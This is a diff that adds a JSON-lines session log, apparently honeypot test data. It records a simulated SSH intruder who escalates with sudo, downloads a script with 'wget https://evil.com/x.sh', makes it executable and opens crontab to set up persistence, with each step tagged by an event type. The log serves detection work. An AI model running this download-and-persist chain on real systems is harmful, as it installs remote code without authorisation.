@@ -1,0 +1,14 @@
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:06:52.808075+00:00", "event": "session_start", "value": "", "cwd": "/root", "protocol": "ssh"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:00.832783+00:00", "event": "command", "value": "sudo whoami"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:00.832979+00:00", "event": "privilege_escalation", "value": "sudo whoami", "technique": "sudo"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:03.269357+00:00", "event": "command", "value": "bash"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:03.269590+00:00", "event": "interpreter_exec", "value": "bash"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:15.487328+00:00", "event": "command", "value": "wget https://evil.com/x.sh"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:15.487512+00:00", "event": "download_attempt", "value": "https://evil.com/x.sh", "command": "wget https://evil.com/x.sh"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:15.487554+00:00", "event": "file_drop", "value": "x.sh", "source_url": "https://evil.com/x.sh", "method": "wget"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:26.845423+00:00", "event": "command", "value": "chmod +x x.sh"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:26.845585+00:00", "event": "permission_change", "value": "chmod +x x.sh"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:30.643369+00:00", "event": "command", "value": "crontab -e"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:30.643532+00:00", "event": "persistence_attempt", "value": "crontab -e"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:32.488497+00:00", "event": "command", "value": "exit"}
+{"session_id": "166ea9a7", "peer_ip": "127.0.0.1", "peer_port": 47982, "timestamp": "2026-07-23T11:07:32.488816+00:00", "event": "session_end", "value": "duration=39s", "duration_seconds": 39}
